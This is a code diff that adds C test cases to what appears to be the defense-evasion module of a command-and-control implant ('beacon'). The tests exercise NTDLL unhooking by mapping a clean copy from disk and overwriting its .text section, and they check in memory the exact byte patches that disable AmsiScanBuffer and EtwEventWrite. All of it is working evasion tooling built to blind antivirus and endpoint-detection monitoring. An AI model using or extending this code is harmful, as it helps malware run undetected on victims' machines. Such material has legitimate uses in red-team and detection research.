@@ -293,3 +293,244 @@ BOOL evasion_run()
     return TRUE;
 
 }
+
+// ============================================================
+// BEACON_TEST — evasion / NTDLL test cases
+// ============================================================
+#ifdef BEACON_TEST
+
+// ── NTDLL: map clean copy from disk ─────────────────────────────────
+BOOL test_ntdll_map_from_disk(void) {
+    printf("\n  --- test_ntdll_map_from_disk ---\n");
+
+    PVOID pClean = NULL;
+    BOOL result = MapNtdllFromDisk(&pClean);
+
+    printf("  [*] MapNtdllFromDisk returned: %s\n", result ? "TRUE" : "FALSE");
+
+    if (result && pClean) {
+        // Validate it looks like a PE
+        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pClean;
+        BOOL validDos = (pDos->e_magic == IMAGE_DOS_SIGNATURE);
+        printf("  [*] DOS signature (MZ): %s\n", validDos ? "VALID" : "INVALID");
+
+        if (validDos) {
+            PIMAGE_NT_HEADERS pNt =
+                (PIMAGE_NT_HEADERS)((PBYTE)pClean + pDos->e_lfanew);
+            BOOL validNt = (pNt->Signature == IMAGE_NT_SIGNATURE);
+            printf("  [*] NT signature (PE): %s\n", validNt ? "VALID" : "INVALID");
+            printf("  [*] Number of sections: %d\n",
+                   pNt->FileHeader.NumberOfSections);
+            printf("  [*] SizeOfImage: %lu\n",
+                   pNt->OptionalHeader.SizeOfImage);
+            result = validDos && validNt;
+        }
+        UnmapViewOfFile(pClean);
+    }
+
+    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
+    return result;
+}
+
+// ── NTDLL: fetch local (hooked) base ────────────────────────────────
+BOOL test_ntdll_fetch_local_base(void) {
+    printf("\n  --- test_ntdll_fetch_local_base ---\n");
+
+    PVOID pLocal = FetchLocalNtdllBaseAddress();
+    BOOL result = (pLocal != NULL);
+
+    printf("  [*] FetchLocalNtdllBaseAddress: %p\n", pLocal);
+
+    if (result) {
+        // Cross-check with GetModuleHandle
+        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+        BOOL match = (pLocal == (PVOID)hNtdll);
+        printf("  [*] GetModuleHandle(\"ntdll.dll\"): %p\n", (PVOID)hNtdll);
+        printf("  [*] Addresses match: %s\n", match ? "YES" : "NO");
+        result = match;
+    }
+
+    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
+    return result;
+}
+
+// ── NTDLL: full unhook success ──────────────────────────────────────
+BOOL test_ntdll_unhook_success(void) {
+    printf("\n  --- test_ntdll_unhook_success ---\n");
+
+    BOOL result = unhook_ntdll();
+    printf("  [*] unhook_ntdll returned: %s\n", result ? "TRUE" : "FALSE");
+
+    if (result) {
+        // Verify ntdll is still functional after unhook
+        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+        BOOL ntdllLoaded = (hNtdll != NULL);
+        printf("  [*] ntdll.dll still loaded: %s\n",
+               ntdllLoaded ? "YES" : "NO");
+
+        // Verify a known export is still resolvable
+        PVOID pFunc = GetProcAddress(hNtdll, "NtQuerySystemInformation");
+        BOOL funcResolved = (pFunc != NULL);
+        printf("  [*] NtQuerySystemInformation resolved: %s (%p)\n",
+               funcResolved ? "YES" : "NO", pFunc);
+
+        // Verify first bytes are a syscall stub (not a hook JMP)
+        // Typical syscall stub starts with: mov r10, rcx (4C 8B D1)
+        if (funcResolved) {
+            BYTE* pBytes = (BYTE*)pFunc;
+            printf("  [*] First 4 bytes: %02X %02X %02X %02X\n",
+                   pBytes[0], pBytes[1], pBytes[2], pBytes[3]);
+#ifdef _WIN64
+            BOOL cleanStub = (pBytes[0] == 0x4C && pBytes[1] == 0x8B &&
+                              pBytes[2] == 0xD1);
+            printf("  [*] Looks like clean syscall stub (4C 8B D1): %s\n",
+                   cleanStub ? "YES" : "NO (may still be OK)");
+#else
+            printf("  [*] x86 stub — manual verification needed\n");
+#endif
+        }
+
+        result = ntdllLoaded && funcResolved;
+    }
+
+    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
+    return result;
+}
+
+// ── NTDLL: .text section replacement ────────────────────────────────
+BOOL test_ntdll_replace_text(void) {
+    printf("\n  --- test_ntdll_replace_text ---\n");
+
+    PVOID pClean = NULL;
+    BOOL mapResult = MapNtdllFromDisk(&pClean);
+    if (!mapResult || !pClean) {
+        printf("  [!] Cannot map clean NTDLL — FAIL\n");
+        printf("  --- RESULT: FAIL ---\n");
+        return FALSE;
+    }
+
+    BOOL result = ReplaceNtdllTxtSection(pClean);
+    printf("  [*] ReplaceNtdllTxtSection returned: %s\n",
+           result ? "TRUE" : "FALSE");
+
+    // Verify ntdll still works after .text replacement
+    if (result) {
+        PVOID pFunc = GetProcAddress(GetModuleHandleA("ntdll.dll"),
+                                     "NtClose");
+        printf("  [*] NtClose still resolvable: %s\n",
+               pFunc ? "YES" : "NO");
+        result = (pFunc != NULL);
+    }
+
+    UnmapViewOfFile(pClean);
+    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
+    return result;
+}
+
+// ── AMSI patch: success ─────────────────────────────────────────────
+BOOL test_amsi_patch_success(void) {
+    printf("\n  --- test_amsi_patch_success ---\n");
+
+    BOOL result = patch_amsi();
+    printf("  [*] patch_amsi returned: %s\n", result ? "TRUE" : "FALSE");
+
+    // If AMSI was patched, verify the patch bytes are in place
+    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+    if (hAmsi) {
+        PVOID pFunc = GetProcAddress(hAmsi, "AmsiScanBuffer");
+        if (pFunc) {
+            BYTE* p = (BYTE*)pFunc;
+            // Should be: B8 57 00 07 80 C3
+            BOOL patched = (p[0] == 0xB8 && p[1] == 0x57 && p[5] == 0xC3);
+            printf("  [*] AmsiScanBuffer bytes: %02X %02X %02X %02X %02X %02X\n",
+                   p[0], p[1], p[2], p[3], p[4], p[5]);
+            printf("  [*] Patch bytes in place: %s\n",
+                   patched ? "YES" : "NO");
+        }
+    } else {
+        printf("  [*] amsi.dll not loaded — patch returned TRUE (expected)\n");
+    }
+
+    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
+    return result;
+}
+
+// ── AMSI patch: not loaded (should succeed gracefully) ──────────────
+BOOL test_amsi_not_loaded(void) {
+    printf("\n  --- test_amsi_not_loaded ---\n");
+
+    // If amsi.dll is not loaded in this process, patch_amsi should
+    // return TRUE (it's not an error condition — just no PowerShell host)
+    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+    if (hAmsi) {
+        printf("  [*] SKIPPED — amsi.dll is already loaded\n");
+        return TRUE;
+    }
+
+    // Don't load amsi.dll — just call patch
+    printf("  [*] amsi.dll not present in process\n");
+    BOOL result = patch_amsi();
+    printf("  [*] patch_amsi returned: %s (expected TRUE)\n",
+           result ? "TRUE" : "FALSE");
+
+    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
+    return result;
+}
+
+// ── ETW patch: success ──────────────────────────────────────────────
+BOOL test_etw_patch_success(void) {
+    printf("\n  --- test_etw_patch_success ---\n");
+
+    BOOL result = patch_etw();
+    printf("  [*] patch_etw returned: %s\n", result ? "TRUE" : "FALSE");
+
+    // Verify the patch bytes
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (hNtdll && result) {
+        PVOID pFunc = GetProcAddress(hNtdll, "EtwEventWrite");
+        if (pFunc) {
+            BYTE* p = (BYTE*)pFunc;
+            // Should be: 33 C0 C3 (xor eax,eax; ret)
+            BOOL patched = (p[0] == 0x33 && p[1] == 0xC0 && p[2] == 0xC3);
+            printf("  [*] EtwEventWrite bytes: %02X %02X %02X\n",
+                   p[0], p[1], p[2]);
+            printf("  [*] Patch bytes in place: %s\n",
+                   patched ? "YES" : "NO");
+        }
+    }
+
+    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
+    return result;
+}
+
+// ── Full evasion pipeline ───────────────────────────────────────────
+BOOL test_evasion_full_pipeline(void) {
+    printf("\n  --- test_evasion_full_pipeline ---\n");
+
+    BOOL result = evasion_run();
+    printf("  [*] evasion_run returned: %s\n", result ? "TRUE" : "FALSE");
+
+    // Verify ntdll is functional
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    printf("  [*] ntdll.dll handle: %p\n", (PVOID)hNtdll);
+
+    // Verify we can still call ntdll functions
+    if (hNtdll) {
+        typedef NTSTATUS(NTAPI* fnRtlGetVersion)(PRTL_OSVERSIONINFOW);
+        fnRtlGetVersion pRtlGetVersion =
+            (fnRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
+        if (pRtlGetVersion) {
+            RTL_OSVERSIONINFOW osvi = {0};
+            osvi.dwOSVersionInfoSize = sizeof(osvi);
+            NTSTATUS status = pRtlGetVersion(&osvi);
+            printf("  [*] RtlGetVersion post-unhook: NT %lu.%lu Build %lu (status=0x%08lX)\n",
+                   osvi.dwMajorVersion, osvi.dwMinorVersion,
+                   osvi.dwBuildNumber, status);
+        }
+    }
+
+    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
+    return result;
+}
+
+#endif /* BEACON_TEST */
